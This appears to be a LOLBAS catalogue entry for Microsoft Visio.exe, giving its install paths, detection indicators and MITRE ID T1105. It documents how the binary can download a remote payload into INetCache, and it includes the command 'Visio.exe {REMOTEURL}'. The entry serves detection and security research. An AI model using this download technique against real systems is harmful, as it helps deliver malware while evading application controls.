---
Acknowledgement:
- Person: Avihay El
Author: Avihay Eldad
Commands:
- Category: Download
  Command: Visio.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2024-02-15
Description: Microsoft Visio Executable
Detection:
- IOC: URL on a visio.exe command line
- IOC: visio.exe making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe
- Path: C:\Program Files\Microsoft Office\Office14\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe
- Path: C:\Program Files\Microsoft Office\Office15\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe
- Path: C:\Program Files\Microsoft Office\Office16\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe
- Path: C:\Program Files\Microsoft Office\root\Office14\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe
- Path: C:\Program Files\Microsoft Office\root\Office15\Visio.exe
- Path: C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe
- Path: C:\Program Files\Microsoft Office\root\Office16\Visio.exe
Name: Visio.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# Visio.exe

Microsoft Visio Executable

# Path(s)

- `C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe`
- `C:\Program Files\Microsoft Office\Office14\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe`
- `C:\Program Files\Microsoft Office\Office15\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe`
- `C:\Program Files\Microsoft Office\Office16\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe`
- `C:\Program Files\Microsoft Office\root\Office14\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe`
- `C:\Program Files\Microsoft Office\root\Office15\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe`
- `C:\Program Files\Microsoft Office\root\Office16\Visio.exe`

# Download Commands

Downloads payload from remote server

```batch
Visio.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows


# Acknowledgements

- Avihay Eldad (Authored, 2024-02-15)
- Avihay El